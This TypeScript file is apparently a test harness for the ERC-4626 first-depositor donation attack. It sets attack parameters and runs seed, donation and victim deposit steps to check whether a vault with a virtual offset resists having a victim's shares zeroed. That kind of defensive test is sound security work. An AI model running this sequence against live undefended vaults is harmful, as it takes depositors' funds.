/**
 * First-depositor donation-attack harness.
 *
 * Classic sequence (OZ ERC-4626 inflation docs / tests):
 *   1) attacker deposits `seed` (often 1 wei) → sole shareholder
 *   2) attacker `transfer`s `donation` directly to vault (no shares minted)
 *   3) victim deposits `victimAssets`
 *
 * Without virtual offset, donation ≈ victimAssets zeros the victim's shares.
 * With δ=3, OZ notes a successful zeroing frontrun needs attacker capital on the
 * order of 10**δ times the victim deposit.
 */

export type AttackParams = {
  seed: bigint;
  donation: bigint;
  victimAssets: bigint;
};

/** Params that zero a naive (no virtual offset) vault after a 1-wei seed. */
export const CLASSIC_ZEROING_ATTACK: AttackParams = {
  seed: 1n,
  donation: 10n ** 18n, // 1e18
  victimAssets: 10n ** 18n, // 1e18
};

/** Donation ~ 10**3 * U — OZ-scale bound for δ=3; still must fail to zero defended vault. */
export const BOUND_SCALE_ATTACK: AttackParams = {
  seed: 1n,
  donation: 10n ** 3n * 10n ** 18n - 1n, // 1000e18 - 1
  victimAssets: 10n ** 18n,
};

export type AttackActors = {
  vault: any;
  asset: any;
  attacker: any;
  victim: any;
};

export type AttackResult = {
  victimShares: bigint;
  attackerOut: bigint;
  committed: bigint;
  victimRedeemable: bigint;
  totalAssets: bigint;
  totalSupply: bigint;
};

export async function runDonationAttack(
  { vault, asset, attacker, victim }: AttackActors,
  { seed, donation, victimAssets }: AttackParams,
): Promise<AttackResult> {
  // 1) seed
  await vault.connect(attacker).deposit(seed, attacker.address);

  // 2) donation (no mint)
  await asset.connect(attacker).transfer(await vault.getAddress(), donation);

  // 3) victim deposit
  const victimShares = await vault.connect(victim).deposit.staticCall(victimAssets, victim.address);
  if (victimShares > 0n) {
    await vault.connect(victim).deposit(victimAssets, victim.address);
  }
  // If preview/staticCall is 0, attempting deposit may still pull assets for some impls;
  // OZ deposit with 0 shares still transfers assets. We still call deposit to mirror life.
  if (victimShares === 0n) {
    await vault.connect(victim).deposit(victimAssets, victim.address);
  }

  const attackerShares = await vault.balanceOf(attacker.address);
  let attackerOut = 0n;
  if (attackerShares > 0n) {
    attackerOut = await vault
      .connect(attacker)
      .redeem.staticCall(attackerShares, attacker.address, attacker.address);
    await vault.connect(attacker).redeem(attackerShares, attacker.address, attacker.address);
  }

  const victimBal = await vault.balanceOf(victim.address);
  const victimRedeemable = victimBal > 0n ? await vault.previewRedeem(victimBal) : 0n;

  return {
    victimShares: await vault.balanceOf(victim.address), // actual minted (0 if zeroed)
    attackerOut,
    committed: seed + donation,
    victimRedeemable,
    totalAssets: await vault.totalAssets(),
    totalSupply: await vault.totalSupply(),
  };
}

/** Preview-only poisoning (no victim deposit / redeem) for comparing previewDeposit. */
export async function poisonVault(
  { vault, asset, attacker }: { vault: any; asset: any; attacker: any },
  seed: bigint,
  donation: bigint,
) {
  await vault.connect(attacker).deposit(seed, attacker.address);
  await asset.connect(attacker).transfer(await vault.getAddress(), donation);
}
